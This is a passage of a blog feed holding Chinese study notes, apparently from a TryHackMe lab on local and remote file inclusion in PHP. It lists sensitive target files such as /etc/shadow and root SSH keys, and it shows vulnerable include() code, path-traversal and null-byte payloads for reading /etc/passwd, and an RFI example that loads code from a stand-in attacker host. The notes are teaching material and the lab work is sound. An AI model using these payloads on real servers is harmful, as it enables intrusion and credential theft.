      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/proc/version&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;指定 Linux 内核的版本&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;etc/passwd&lt;/code&gt; &lt;code&gt;等/passwd&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;具有有权访问系统的所有注册用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含有关系统用户密码的信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.bash_history&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含 &lt;code&gt;root &lt;/code&gt;用户的 history 命令&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/dmessage&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含全局系统消息，包括系统启动期间记录的消息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;`/var/mail/root&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;根&lt;/code&gt;用户的所有电子邮件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.ssh/id_rsa&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;服务器上 root 或任何已知有效用户的私有 SSH 密钥&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Web 服务器的&lt;/code&gt;访问请求&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;C:\boot.ini&lt;/code&gt; &lt;code&gt;C：\boot.ini&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含具有 BIOS 固件的计算机的启动选项&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;本地文件包含-lfi&#34;&gt;本地文件包含 LFI
&lt;/h2&gt;&lt;h3 id=&#34;一&#34;&gt;一
&lt;/h3&gt;&lt;p&gt;针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;lang&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=AR.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=AR.php&lt;/a&gt;加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。&lt;/p&gt;
&lt;p&gt;理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd&lt;/p&gt;
&lt;p&gt;在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。&lt;/p&gt;
&lt;h3 id=&#34;二&#34;&gt;二
&lt;/h3&gt;&lt;p&gt;接下来，在下面的代码中，开发人员决定指定函数内部的目录。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;languages/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lang&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。&lt;/p&gt;
&lt;p&gt;如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。&lt;/p&gt;
&lt;p&gt;同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;本地文件包含-lfi2&#34;&gt;本地文件包含 LFI2
&lt;/h2&gt;&lt;p&gt;在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。&lt;/p&gt;
&lt;p&gt;在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。&lt;/p&gt;
&lt;p&gt;在此方案中，我们有以下入口点： &lt;code&gt;http://webapp.thm/index.php?lang=EN&lt;/code&gt; 。如果我们输入无效的输入（例如 THM），则会收到以下错误&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：&lt;code&gt;include（languages/THM.php）;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：&lt;code&gt;index.php？lang=EN&lt;/code&gt;，其中文件 EN 位于给定的语言目录中，名为 EN。php 的&lt;/p&gt;
&lt;p&gt;此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 &lt;code&gt;/var/www/html/THM-4/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要利用这一点，我们需要使用 &lt;code&gt;../&lt;/code&gt; 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 &lt;code&gt;/var/www/html/THM-4&lt;/code&gt;。但我们仍然收到以下错误：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/../../../../../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 &lt;code&gt;%00&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。&lt;/p&gt;
&lt;p&gt;通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include(&amp;#34;languages/../../../../../etc/passwd%00&amp;#34;).&amp;#34;.php&amp;#34;); `等同于 `include(&amp;#34;languages/../../../../../etc/passwd&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。&lt;/p&gt;
&lt;h3 id=&#34;四&#34;&gt;四
&lt;/h3&gt;&lt;p&gt;现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们收到了以下错误！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。&lt;/p&gt;
&lt;p&gt;首先，我们可以发送以下 payload 来绕过它： &lt;code&gt;....//....//....//....//....//etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 &lt;code&gt;../&lt;/code&gt; 它找到并且不执行另一次传递，留下下图所示的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319152704750.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;五&#34;&gt;五
&lt;/h3&gt;&lt;p&gt;最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=languages/EN.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index的php?lang=languages/EN.php&lt;/a&gt;然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： &lt;code&gt;?lang=languages/../../../../../etc/passwd&lt;/code&gt; 。&lt;/p&gt;
&lt;h2 id=&#34;远程文件包含-rfi&#34;&gt;远程文件包含 RFI
&lt;/h2&gt;&lt;p&gt;远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。&lt;/p&gt;
&lt;p&gt;RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;li&gt;跨站点脚本 （XSS）&lt;/li&gt;
&lt;li&gt;拒绝服务 （DoS）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319152859979.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;rfi步骤&#34;&gt;RFI步骤
&lt;/h3&gt;&lt;p&gt;下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?PHP echo &amp;#34;Hello THM&amp;#34;; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&lt;/a&gt;的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DOM 文档对象模型</title>
        <link>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png" alt="Featured image of post DOM 文档对象模型" /&gt;&lt;h1 id=&#34;dom&#34;&gt;DOM
&lt;/h1&gt;&lt;p&gt;Document Object Model 文档对象模型&lt;/p&gt;
